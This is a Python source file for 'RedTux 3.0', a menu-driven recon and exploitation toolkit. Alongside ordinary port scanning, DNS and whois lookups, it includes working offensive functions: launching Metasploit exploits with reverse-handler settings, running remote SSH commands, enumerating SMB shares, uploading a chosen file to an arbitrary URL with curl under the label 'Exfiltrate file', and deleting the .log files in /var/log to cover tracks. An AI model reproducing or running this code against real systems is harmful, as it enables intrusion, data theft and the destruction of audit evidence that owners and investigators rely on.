#!/usr/bin/env python3
"""
RedTux 3.0 - Interactive Recon & Exploitation Toolkit
Author: Adriel Cardoso Araújo
"""

import os
import sys
import socket
import base64
import subprocess
import logging
import shutil
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

# Colorama fallback
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _C:
        def __getattr__(self, name): return ''
    Fore = Style = _C()

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s][%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

class RedTux:
    def __init__(self):
        self.thread_count = 50
        self.default_ports = [21,22,23,25,53,80,443,3389]
        self.menu_actions = {
            '1': ('Port scan', self.port_scan),
            '2': ('DNS lookup', self.dns_lookup),
            '3': ('Subdomain recon (Sublist3r)', self.recon_subdomains),
            '4': ('HTTP banner grab', self.http_banner),
            '5': ('Whois lookup', self.whois_lookup),
            '6': ('Traceroute', self.traceroute),
            '7': ('Metasploit exploit', self.metasploit),
            '8': ('SSH exec (Paramiko)', self.ssh_exec),
            '9': ('SMB enum (Impacket)', self.smb_enum),
            '10':('Obfuscate/Deobfuscate', self.obf_menu),
            '11':('Exfiltrate file (curl)', self.exfiltrate),
            '12':('Clear logs', self.clear_logs),
            '0': ('Exit', None),
        }

    def check_dep(self, cmd):
        if shutil.which(cmd) is None:
            logging.warning(f"Dependency '{cmd}' not found.")
            return False
        return True

    def port_scan(self):
        target = input("Target IP/domain: ")
        ports = input(f"Ports [{','.join(map(str,self.default_ports))}]: ")
        ports = [int(p.strip()) for p in (ports or ",".join(map(str,self.default_ports))).split(',')]
        results = []
        def scan(p):
            s=socket.socket(); s.settimeout(1)
            if s.connect_ex((target,p))==0:
                logging.info(Fore.GREEN+f"[+] {target}:{p} open")
                results.append(p)
            s.close()
        ThreadPoolExecutor(self.thread_count).map(scan, ports)
        if input("JSON output? (y/N): ").lower()=='y':
            print(json.dumps({'target':target,'open_ports':results},indent=2))
        input("Press Enter to continue...")

    def dns_lookup(self):
        host = input("Hostname: ")
        try:
            ips = socket.gethostbyname_ex(host)[2]
            print(Fore.CYAN + "IP addresses:", ", ".join(ips))
        except Exception as e:
            logging.error(e)
        input("Press Enter to continue...")

    def recon_subdomains(self):
        if not self.check_dep('sublist3r'):
            return input("Install Sublist3r and retry. Press Enter...")
        dom = input("Domain: ")
        out = input("Output file (or leave blank): ")
        cmd = ['sublist3r','-d',dom] + (['-o',out] if out else [])
        subprocess.run(cmd)
        input("Press Enter to continue...")

    def http_banner(self):
        host = input("Target IP/domain: ")
        port = int(input("Port [80]: ") or 80)
        try:
            s=socket.socket(); s.settimeout(2)
            s.connect((host,port))
            s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
            banner = s.recv(1024).decode(errors='ignore')
            print(Fore.CYAN + banner.strip())
            s.close()
        except Exception as e:
            logging.error(e)
        input("Press Enter to continue...")

    def whois_lookup(self):
        domain = input("Domain: ")
        if not self.check_dep('whois'):
            return input("Install 'whois' and retry. Press Enter...")
        subprocess.run(['whois',domain])
        input("Press Enter to continue...")

    def traceroute(self):
        host = input("Target IP/domain: ")
        tool = 'tracert' if os.name=='nt' else 'traceroute'
        if not self.check_dep(tool):
            return input(f"Install '{tool}' and retry. Press Enter...")
        subprocess.run([tool,host])
        input("Press Enter to continue...")

    def metasploit(self):
        if not self.check_dep('msfconsole'):
            return input("Install Metasploit and retry. Press Enter...")
        mod = input("Module (e.g. exploit/multi/handler): ")
        rhost = input("RHOST: ")
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        cmd = f'msfconsole -q -x "use {mod}; set RHOST {rhost}; set LHOST {lhost}; set LPORT {lport}; exploit; exit"'
        subprocess.run(cmd, shell=True)
        input("Press Enter to continue...")

    def ssh_exec(self):
        try:
            import paramiko
        except ImportError:
            logging.error("Paramiko missing.")
            return input("pip install paramiko. Press Enter...")
        host = input("Host: "); user = input("User: "); pwd = input("Password: "); cmd = input("Command: ")
        client=paramiko.SSHClient(); client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host,username=user,password=pwd,timeout=5)
            stdin,stdout,stderr=client.exec_command(cmd)
            print(stdout.read().decode()); err=stderr.read().decode()
            if err: logging.warning(err)
        finally: client.close()
        input("Press Enter to continue...")

    def smb_enum(self):
        try:
            from impacket.smbconnection import SMBConnection
        except ImportError:
            logging.error("Impacket missing.")
            return input("pip install impacket. Press Enter...")
        host=input("Host: "); user=input("User: "); pwd=input("Password: ")
        conn=SMBConnection(user,pwd,'redtux',host)
        try:
            conn.connect(host,445)
            for s in conn.listShares():
                print(Fore.CYAN + s['shi1_netname'].decode().strip())
        except Exception as e:
            logging.error(e)
        finally:
            conn.close()
        input("Press Enter to continue...")

    def obf_menu(self):
        choice = input("1) Obfuscate  2) Deobfuscate: ")
        text = input("Text/Base64: ")
        if choice=='1':
            print(Fore.CYAN + base64.b64encode(text.encode()).decode())
        else:
            print(Fore.CYAN + base64.b64decode(text.encode()).decode())
        input("Press Enter to continue...")

    def exfiltrate(self):
        path = input("File path: ")
        url  = input("Target URL: ")
        if not os.path.isfile(path):
            logging.error("File not found.")
        elif not self.check_dep('curl'):
            logging.error("curl missing.")
        else:
            subprocess.run(['curl','-F',f"file=@{path}",url])
        input("Press Enter to continue...")

    def clear_logs(self):
        d = input("Log directory [/var/log]: ") or '/var/log'
        for p in Path(d).glob('*.log'):
            try: p.unlink(); logging.info(f"Deleted {p}")
            except Exception as e: logging.warning(e)
        input("Press Enter to continue...")

    def show_menu(self):
        os.system('cls' if os.name=='nt' else 'clear')
        print(Style.BRIGHT + "=== RedTux 3.0 Menu ===")
        for k, (desc, _) in sorted(self.menu_actions.items(), key=lambda x: int(x[0])):
            print(f"{k}. {desc}")
        print()

    def run(self):
        while True:
            self.show_menu()
            choice = input("Select an option: ").strip()
            action = self.menu_actions.get(choice)
            if not action:
                print("Invalid option.")
                input("Press Enter to continue...")
            elif choice == '0':
                print("Exiting.")
                break
            else:
                action[1]()

if __name__ == '__main__':
    RedTux().run()
